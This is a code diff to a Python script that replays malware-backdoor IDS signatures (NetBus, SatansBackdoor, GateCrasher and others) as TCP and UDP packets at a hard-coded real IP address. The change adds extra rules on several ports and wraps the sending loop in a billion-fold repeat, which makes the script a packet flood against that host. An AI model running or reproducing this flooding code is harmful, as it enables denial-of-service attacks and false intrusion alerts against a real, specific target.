@@ -22,8 +22,23 @@ rules = [
     {"msg": "MALWARE-BACKDOOR NetBus Pro 2.0 connection established", "proto": "tcp", "dport": 20034, "payload": b"BN\x10\x00\x02\x00\x05\x00"},
     {"msg": "MALWARE-BACKDOOR SatansBackdoor.2.0.Beta", "proto": "tcp", "dport": 666, "payload": b"Remote: You are connected to me.\r\nRemote: Ready for commands"},
     {"msg": "MALWARE-BACKDOOR Doly 2.0 access", "proto": "tcp", "dport": 6789, "payload": b"Wtzup Use"},
+    
     {"msg": "example", "proto": "tcp", "dport": 6789, "payload": "example"},
+    {"msg": "example", "proto": "tcp", "dport": 1488, "payload": "example"},
+    {"msg": "example", "proto": "tcp", "dport": 22869, "payload": "example"},
+    {"msg": "example", "proto": "tcp", "dport": 27500, "payload": "example"},
+    {"msg": "example", "proto": "tcp", "dport": 53672, "payload": "example"},
+    {"msg": "example", "proto": "tcp", "dport": 10007, "payload": "example"},
     {"msg": "example", "proto": "tcp", "dport": 80, "payload": "example"},
+    
+    {"msg": "example", "proto": "udp", "dport": 6789, "payload": "example"},
+    {"msg": "example", "proto": "udp", "dport": 1488, "payload": "example"},
+    {"msg": "example", "proto": "udp", "dport": 22869, "payload": "example"},
+    {"msg": "example", "proto": "udp", "dport": 27500, "payload": "example"},
+    {"msg": "example", "proto": "udp", "dport": 53672, "payload": "example"},
+    {"msg": "example", "proto": "udp", "dport": 10007, "payload": "example"},
+    {"msg": "example", "proto": "udp", "dport": 80, "payload": "example"},
+    
     {"msg": "MALWARE-BACKDOOR HackAttack 1.20 Connect", "proto": "tcp", "dport": 31785, "payload": b"host"},
     {"msg": "PROTOCOL-FTP ADMw0rm ftp login attempt", "proto": "tcp", "dport": 21, "payload": b"USER w0rm"},
     {"msg": "MALWARE-BACKDOOR GateCrasher", "proto": "tcp", "dport": 6969, "payload": b"GateCrasher Server On-Line..."},
@@ -44,14 +59,15 @@ rules = [
 target_ip = "109.71.242.119"
 
 for rule in rules:
-    if rule["proto"] == "tcp":
-        if isinstance(rule["dport"], str) and ":" in rule["dport"]:
-            dport_start, dport_end = map(int, rule["dport"].split(":"))
-            for port in range(dport_start, dport_end + 1):
-                send_tcp_packet(target_ip, port, rule["payload"])
-        else:
-            send_tcp_packet(target_ip, rule["dport"], rule["payload"])
-    elif rule["proto"] == "udp":
-        send_udp_packet(target_ip, rule["dport"], rule["payload"])
+    for i in range(1_000_000_000):
+        if rule["proto"] == "tcp":
+            if isinstance(rule["dport"], str) and ":" in rule["dport"]:
+                dport_start, dport_end = map(int, rule["dport"].split(":"))
+                for port in range(dport_start, dport_end + 1):
+                    send_tcp_packet(target_ip, port, rule["payload"])
+            else:
+                send_tcp_packet(target_ip, rule["dport"], rule["payload"])
+        elif rule["proto"] == "udp":
+            send_udp_packet(target_ip, rule["dport"], rule["payload"])
 
 print("All packets sent.")
